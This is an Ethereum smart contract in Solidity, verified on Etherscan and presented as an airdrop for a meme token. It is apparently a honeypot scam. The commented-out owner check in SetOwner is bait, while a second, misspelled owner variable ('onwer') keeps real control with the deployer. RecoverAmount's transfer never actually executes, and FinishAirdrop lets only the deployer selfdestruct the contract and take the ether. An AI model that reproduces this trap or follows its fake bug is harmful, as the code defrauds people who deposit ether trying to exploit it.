/**
 *Submitted for verification at Etherscan.io on 2025-01-17
*/

pragma solidity ^0.4.22;

contract Ownable{
    address internal onwer;
    function Ownable() public {
        onwer = msg.sender;
    }
}

contract MAGA_ELON_TOKEN_AIRDROP is Ownable {

    uint256 public airdropTreshold = 0.5 ether;
    address public owner;

    function MAGA_ELON_TOKEN_AIRDROP() public {
        owner = msg.sender;
    }
    
    function SetOwner(address _owner) public {
        // require(owner == msg.sender, "only owner"); <-- Enable this on production !!
        owner = _owner;
    }

    function Deposit() public payable {}

    function Airdrop(address[] receivers, uint256 amount) public {
        require(owner == msg.sender, "only owner");
        require(address(this).balance >= airdropTreshold, "not started");

        for (uint256 i = 0; i < receivers.length; i++) {
            // Airdrop
            receivers[i].call.value(amount);
        }
    }

    function RecoverAmount(uint256 amount) public payable {
        require(owner == msg.sender, "only owner");
        require(address(this).balance >= airdropTreshold, "not started");
        // Transfer
        msg.sender.call.value(amount);
    }

    function FinishAirdrop() public {
        require(onwer == msg.sender, "only owner");
        selfdestruct(onwer); 
    }

}